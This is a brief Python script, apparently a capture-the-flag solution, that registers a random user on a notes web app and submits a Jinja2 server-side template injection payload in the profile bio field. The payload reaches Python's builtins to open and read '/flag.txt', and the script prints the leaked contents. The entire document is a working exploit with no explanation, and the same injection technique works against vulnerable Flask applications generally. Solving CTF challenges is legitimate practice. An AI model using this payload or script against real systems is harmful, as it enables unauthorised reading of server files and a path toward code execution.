#!/usr/bin/env python3

import random
import re
import string

import requests
from pwn import log

url = "https://maas.rars.win"

payload = "1337{{ get_flashed_messages.__globals__.__builtins__.open('/flag.txt').read() }}1337"

sess = requests.Session()

user = "".join(random.choice(string.ascii_letters) for _ in range(0x10))
log.info("Registering user %s..." % user)
r = sess.post(f"{url}/notes/register", data={"username": user})
assert r.status_code == 200

r = sess.post(f"{url}/notes/profile", data={"mode": "bioadd", "bio": payload})
assert r.status_code == 200

match = re.search("1337(?P<output>.+)1337", r.text, re.DOTALL)
print(match.group("output"))
